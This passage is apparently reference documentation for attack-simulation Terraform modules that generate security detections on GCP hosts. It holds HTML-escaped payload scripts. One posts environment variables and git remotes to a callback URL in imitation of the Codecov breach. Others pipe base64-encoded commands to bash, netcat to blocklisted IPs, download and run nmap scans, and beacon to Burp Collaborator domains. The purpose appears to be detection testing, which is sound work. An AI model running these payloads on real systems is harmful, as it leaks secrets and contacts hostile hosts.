2&gt;&amp;1<br/>    log &quot;requirements installed&quot;<br/>    <br/>    log &quot;gettting cloudsql cert&quot;<br/>    python3 get&#45;cloudsql&#45;cert&#46;py &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;cloudsql cert complete&quot;<br/><br/>    log &quot;running mysql boostrap&#46;&#46;&#46;&quot;<br/>    mysql &#45;&#45;ssl&#45;ca=cloudsql&#45;combined&#45;ca&#45;bundle&#46;pem &#45;&#45;ssl&#45;mode=REQUIRED &#45;h $&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;private&&#35;95;ip&quot;&&#35;93;&&#35;125; &#45;u$&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;user&quot;&&#35;93;&&#35;125; &#45;p$&&#35;123;var&#46;inputs&&#35;91;&quot;db&&#35;95;password&quot;&&#35;93;&&#35;125; &lt; bootstrap&#46;sql  &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    log &quot;mysql boostrap complete&quot;<br/><br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;starting app&quot;<br/>        screen &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;X quit<br/>        screen &#45;wipe<br/>        screen &#45;d &#45;L &#45;Logfile /tmp/$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;&#46;log &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;m /$&&#35;123;local&#46;app&&#35;95;dirname&&#35;125;/entrypoint&#46;sh<br/>        screen &#45;S $&&#35;123;local&#46;app&&#35;95;dirname&&#35;125; &#45;X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url&#46;&#46;&#46;&quot;<br/>        while &#33; curl &#45;sv http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;/cast &#124; tee &#45;a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$&&#35;123;var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;&&#35;125;/cast &#45; retrying&quot;<br/>            sleep 60<br/>        done<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;curl python3&#45;pip mysql&#45;client&#45;core&#45;8&#46;0&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;curl python3&#45;pip mysql&#45;shell&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    app = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/app&#46;py&quot;<br/>                        &&#35;41;<br/>    test = file&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/test&#46;py&quot;<br/>                        &&#35;41;<br/>    requirements = file&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/requirements&#46;txt&quot;,<br/>                        &&#35;41;<br/>    database = templatefile&&#35;40;<br/>                          &quot;$&&#35;123;path&#46;module&&#35;125;/resources/bootstrap&#46;sql&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                db&&#35;95;user = var&#46;inputs&&#35;91;&quot;db&&#35;95;user&quot;&&#35;93;<br/>                                db&&#35;95;name = var&#46;inputs&&#35;91;&quot;db&&#35;95;name&quot;&&#35;93;<br/>                                db&&#35;95;iam&&#35;95;user = var&#46;inputs&&#35;91;&quot;db&&#35;95;iam&&#35;95;user&quot;&&#35;93;<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    entrypoint = templatefile&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/entrypoint&#46;sh&#46;tpl&quot;,<br/>                            &&#35;123;<br/>                                 listen&&#35;95;port = var&#46;inputs&&#35;91;&quot;listen&&#35;95;port&quot;&&#35;93;<br/>                                 app&&#35;95;path = local&#46;app&&#35;95;path<br/>                            &&#35;125;<br/>                        &&#35;41;<br/>    index = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/index&#46;html&quot;<br/>                        &&#35;41;<br/>    cast = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/cast&#46;html&quot;<br/>                        &&#35;41;<br/>    get&&#35;95;cloudsql&&#35;95;cert = file&&#35;40;<br/>                            &quot;$&&#35;123;path&#46;module&&#35;125;/resources/get&#45;cloudsql&#45;cert&#46;py&quot;<br/>                        &&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        &#35; additional shell check payloads<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;<br/>            &&#35;123;<br/>                name = &quot;$&&#35;123;basename&&#35;40;abspath&&#35;40;path&#46;module&&#35;41;&&#35;41;&&#35;125;&&#35;95;entrypoint&#46;sh&quot;<br/>                content = base64encode&&#35;40;local&#46;entrypoint&&#35;41;<br/>            &&#35;125;<br/>        &&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-osconfig-connect-badip                           | ./modules/osconfig/connect-badip                      | osconfig_connect_bad_ip                         | context.gcp.osconfig.target.connect.badip                        | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "connect": {<br/>                        "badip": {<br/>                            "enabled": false,<br/>                            "iplist_url": "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset",<br/>                            "retry_delay_secs": 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-badip                      | <pre>locals &&#35;123;<br/>    iplist&&#35;95;url = var&#46;inputs&&#35;91;&quot;iplist&&#35;95;url&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        echo $&&#35;123;base64gzip&&#35;40;local&#46;iplist&&#35;95;base64&&#35;41;&&#35;125; &#124; base64 &#45;d &#124; gunzip &gt; threatdb&#46;csv<br/>        log &quot;enumerating bad ips in threatdb&#46;csv&quot;<br/>        for i in $&&#35;40;grep &&#35;x27;IPV4,&&#35;x27; threatdb&#46;csv &#124; awk &#45;F&&#35;x27;,&&#35;x27; &&#35;x27;&&#35;123; print $2 &&#35;125;&&#35;x27; &&#35;41;; do log &quot;connecting to: $i&quot;; nc &#45;vv &#45;w 5 $i 80 &gt;&gt; $LOGFILE 2&gt;&amp;1; sleep 1; done;<br/>        log &&#35;x27;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;retry&&#35;95;delay&&#35;95;secs&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&&#35;x27;;<br/>        sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;retry&&#35;95;delay&&#35;95;secs&quot;&&#35;93;&&#35;125;<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    iplist&&#35;95;base64 = file&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/resources/threatdb&#46;csv&quot;&&#35;41;<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| target-osconfig-connect-codecov                         | ./modules/osconfig/connect-codecov                    | osconfig_connect_codecov                        | context.gcp.osconfig.target.connect.codecov                      | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "connect": {<br/>                        "codecov": {<br/>                            "enabled": false,<br/>                            "env_secrets": [<br/>                                "SECRET=supersecret123"<br/>                            ],<br/>                            "git_origin": "git@git.localhost:repo/repo.git",<br/>                            "host_ip": null,<br/>                            "host_port": 8080,<br/>                            "use_ssl": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-codecov                    | <pre>locals &&#35;123;<br/>    host&&#35;95;ip = var&#46;inputs&&#35;91;&quot;host&&#35;95;ip&quot;&&#35;93;<br/>    host&&#35;95;port = var&#46;inputs&&#35;91;&quot;host&&#35;95;port&quot;&&#35;93;<br/>    git&&#35;95;origin=var&#46;inputs&&#35;91;&quot;git&&#35;95;origin&quot;&&#35;93;<br/>    env&&#35;95;secrets=join&&#35;40;&quot; &quot;, var&#46;inputs&&#35;91;&quot;env&&#35;95;secrets&quot;&&#35;93;&&#35;41;<br/>    callback&&#35;95;url = var&#46;inputs&&#35;91;&quot;use&&#35;95;ssl&quot;&&#35;93; == true ? &quot;https://$&&#35;123;local&#46;host&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;host&&#35;95;port&&#35;125;&quot; : &quot;http://$&&#35;123;local&#46;host&&#35;95;ip&&#35;125;:$&&#35;123;local&#46;host&&#35;95;port&&#35;125;&quot;<br/>    command&&#35;95;payload=&lt;&lt;&#45;EOT<br/>    LOGFILE=/tmp/$&&#35;123;basename&&#35;40;path&#46;module&&#35;41;&&#35;125;&&#35;95;command&#46;log<br/>    function log &&#35;123;<br/>        echo &&#35;96;date &#45;u &#43;&quot;%Y&#45;%m&#45;%dT%H:%M:%SZ&quot;&&#35;96;&quot; $1&quot;<br/>        echo &&#35;96;date &#45;u &#43;&quot;%Y&#45;%m&#45;%dT%H:%M:%SZ&quot;&&#35;96;&quot; $1&quot; &gt;&gt; $LOGFILE<br/>    &&#35;125;<br/>    rm &#45;rf /tmp/repo<br/>    mkdir &#45;p /tmp/repo<br/>    cd /tmp/repo<br/>    git init<br/>    git remote add origin $&&#35;123;local&#46;git&&#35;95;origin&&#35;125;<br/>    log &quot;running curl post: curl &#45;sm 0&#46;5 &#45;d &&#35;92;&quot;$&&#35;40;git remote &#45;v&&#35;41;&lt;&lt;&lt;&lt;&lt;&lt; ENV $&&#35;40;env&&#35;41;&&#35;92;&quot; $&&#35;123;local&#46;callback&&#35;95;url&&#35;125;/upload/v2&quot;<br/>    curl &#45;sm 0&#46;5 &#45;d &quot;$&&#35;40;git remote &#45;v&&#35;41;&lt;&lt;&lt;&lt;&lt;&lt; ENV $&&#35;40;env&&#35;41;&quot; $&&#35;123;local&#46;callback&&#35;95;url&&#35;125;/upload/v2 &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>    sleep 30<br/>    exit<br/>    EOT<br/>    base64&&#35;95;command&&#35;95;payload=local&#46;command&&#35;95;payload<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        screen &#45;S codecov &#45;X quit<br/>        screen &#45;wipe<br/>        truncate &#45;s 0 /tmp/codecov&#46;log<br/>        log &quot;checking for git&#46;&#46;&#46;&quot;<br/>        while &#33; command &#45;v git; do<br/>            log &quot;git not found &#45; waiting&quot;<br/>            sleep 10<br/>        done<br/>        log &quot;git: $&&#35;40;command &#45;v  git&&#35;41;&quot;<br/>        screen &#45;d &#45;Logfile /tmp/codecov&#46;log &#45;S codecov &#45;m env &#45;i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $&&#35;123;local&#46;env&&#35;95;secrets&&#35;125; /bin/bash &#45;&#45;noprofile &#45;&#45;norc<br/>        screen &#45;S codecov &#45;X colon &quot;logfile flush 0^M&quot;<br/>        log &&#35;x27;sending screen command: $&&#35;123;local&#46;command&&#35;95;payload&&#35;125;&&#35;x27;;<br/>        screen &#45;S codecov &#45;p 0 &#45;X stuff &quot;echo &&#35;x27;$&&#35;123;base64gzip&&#35;40;local&#46;base64&&#35;95;command&&#35;95;payload&&#35;41;&&#35;125;&&#35;x27; &#124; base64 &#45;d &#124; gunzip &#124; /bin/bash &#45;^M&quot;<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;git&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;git&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-osconfig-connect-nmap-port-scan                  | ./modules/osconfig/connect-nmap-port-scan             | osconfig_connect_enumerate_host                 | context.gcp.osconfig.target.connect.nmap_port_scan               | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "connect": {<br/>                        "nmap_port_scan": {<br/>                            "enabled": false,<br/>                            "nmap_scan_host": "portquiz.net",<br/>                            "nmap_scan_ports": [<br/>                                80,<br/>                                443,<br/>                                23,<br/>                                22,<br/>                                8080,<br/>                                3389,<br/>                                27017,<br/>                                3306,<br/>                                6379,<br/>                                5432,<br/>                                389,<br/>                                636,<br/>                                1389,<br/>                                1636<br/>                            ]<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-nmap-port-scan             | <pre>locals &&#35;123;<br/>    nmap&&#35;95;download = &quot;https://github&#46;com/andrew&#45;d/static&#45;binaries/blob/master/binaries/linux/x86&&#35;95;64/nmap?raw=true&quot;<br/>    nmap&&#35;95;path = &quot;/tmp/nmap&quot;<br/>    nmap&&#35;95;ports = join&&#35;40;&quot;,&quot;,var&#46;inputs&&#35;91;&quot;nmap&&#35;95;scan&&#35;95;ports&quot;&&#35;93;&&#35;41;<br/>    nmap&&#35;95;scan&&#35;95;host = var&#46;inputs&&#35;91;&quot;nmap&&#35;95;scan&&#35;95;host&quot;&&#35;93;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        log &quot;scan target: $&&#35;123;local&#46;nmap&&#35;95;scan&&#35;95;host&&#35;125; $&&#35;123;local&#46;nmap&&#35;95;ports&&#35;125;&quot;<br/>        log &quot;checking for nmap&quot;<br/>        if &#33; command &#45;v nmap; then<br/>            log &quot;nmap not found&quot;<br/>            log &quot;downloading: $&&#35;123;local&#46;nmap&&#35;95;download&&#35;125;&quot;<br/>            if &&#35;91; &#45;f $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125; &&#35;93;; then<br/>                curl &#45;L &#45;o $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125; $&&#35;123;local&#46;nmap&&#35;95;download&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>                chmod 755 $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>            fi<br/>            log &quot;using nmap: $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125;&quot;<br/>            $&&#35;123;local&#46;nmap&&#35;95;path&&#35;125; &#45;sT &#45;p $&&#35;123;local&#46;nmap&&#35;95;ports&&#35;125; $&&#35;123;local&#46;nmap&&#35;95;scan&&#35;95;host&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        else<br/>            nmap &#45;sS &#45;p $&&#35;123;local&#46;nmap&&#35;95;ports&&#35;125; $&&#35;123;local&#46;nmap&&#35;95;scan&&#35;95;host&&#35;125; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        fi<br/>        log &&#35;x27;waiting 30 minutes&#46;&#46;&#46;&&#35;x27;;<br/>        sleep 1800<br/>        if &#33; check&&#35;95;payload&&#35;95;update /tmp/payload&&#35;95;$SCRIPTNAME $START&&#35;95;HASH; then<br/>            log &quot;payload update detected &#45; exiting loop and forcing payload download&quot;<br/>            rm &#45;f /tmp/payload&&#35;95;$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop&#46;&#46;&#46;&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64&&#35;95;payload = templatefile&&#35;40;&quot;$&&#35;123;path&#46;module&&#35;125;/&#46;&#46;/&#46;&#46;/delayed&&#35;95;start&#46;sh&quot;, &&#35;123; config = &&#35;123;<br/>        script&&#35;95;name = var&#46;inputs&&#35;91;&quot;tag&quot;&&#35;93;<br/>        log&&#35;95;rotation&&#35;95;count = 2<br/>        apt&&#35;95;pre&&#35;95;tasks = &quot;&quot;<br/>        apt&&#35;95;packages = &quot;&quot;<br/>        apt&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        yum&&#35;95;pre&&#35;95;tasks =  &quot;&quot;<br/>        yum&&#35;95;packages = &quot;&quot;<br/>        yum&&#35;95;post&&#35;95;tasks = &quot;&quot;<br/>        script&&#35;95;delay&&#35;95;secs = 30<br/>        next&&#35;95;stage&&#35;95;payload = local&#46;payload<br/>    &&#35;125;&&#35;125;&&#35;41;<br/><br/>    outputs = &&#35;123;<br/>        base64&&#35;95;payload = base64gzip&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload = base64encode&&#35;40;local&#46;base64&&#35;95;payload&&#35;41;<br/>        base64&&#35;95;uncompressed&&#35;95;payload&&#35;95;additional = &&#35;91;&&#35;93;<br/>    &&#35;125;<br/>&&#35;125;</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| target-osconfig-connect-oast-host                       | ./modules/osconfig/connect-oast-host                  | osconfig_connect_oast_host                      | context.gcp.osconfig.target.connect.oast                         | <pre>{<br/>    "context": {<br/>        "gcp": {<br/>            "osconfig": {<br/>                "target": {<br/>                    "connect": {<br/>                        "oast": {<br/>                            "enabled": false,<br/>                            "retry_delay_secs": 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-oast-host                  | <pre>locals &&#35;123;<br/>    oast&&#35;95;domain = &quot;burpcollaborator&#46;net&quot;<br/>    payload = &lt;&lt;&#45;EOT<br/>    START&&#35;95;HASH=$&&#35;40;sha256sum &#45;&#45;text /tmp/payload&&#35;95;$SCRIPTNAME &#124; awk &&#35;x27;&&#35;123; print $1 &&#35;125;&&#35;x27;&&#35;41;<br/>    while true; do<br/>        OAST&&#35;95;URL=&quot;https://$&&#35;40;cat /dev/urandom &#124; tr &#45;dc &&#35;x27;&&#35;91;:lower:&&#35;93;&&#35;x27; &#124; fold &#45;w $$&&#35;123;1:&#45;16&&#35;125; &#124; head &#45;n 1&&#35;41;&#46;$&&#35;123;local&#46;oast&&#35;95;domain&&#35;125;&quot;<br/>        log &quot;http request: $OAST&&#35;95;URL&quot;<br/>        curl &#45;s &quot;$OAST&&#35;95;URL&quot; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &&#35;x27;waiting $&&#35;123;var&#46;inputs&&#35;91;&quot;retry&&#35;95;delay&&#35;95;secs&quot;&&#35;93;&&#35;125; seconds&#46;&#46;&#46;&&#35;x27;;<br/>        sleep $&&#35;123;var&#46;inputs&&#35;91;&quot;retry&&#35;95;delay&&#35;95;secs&quot;&&#35;93;&&#35;125;<br/>        if &#33; check&&#35;95;payload&&#35;95;update 